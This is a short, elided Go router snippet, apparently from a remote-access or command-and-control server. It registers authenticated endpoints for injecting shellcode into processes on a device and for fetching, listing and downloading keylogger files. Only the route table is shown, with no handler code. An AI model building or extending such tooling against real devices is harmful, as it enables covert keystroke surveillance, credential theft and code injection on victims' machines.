...
func InitRouter(ctx *gin.RouterGroup) {
	...
	group := ctx.Group(`/`, AuthHandler)
	{
		...
		group.POST(`/device/process/inject`, process.InjectProcessShellcode)
		...
		group.POST(`/device/info`, utility.GetDeviceMetadata)
		group.POST(`/ui/config`, utility.GetUIConfig)
		group.POST(`/device/keylog`, utility.GetKeylog)
		group.POST(`/device/keylog/files`, utility.ListKeylogFiles)
		group.GET(`/device/keylog/download`, utility.DownloadKeylogFile)
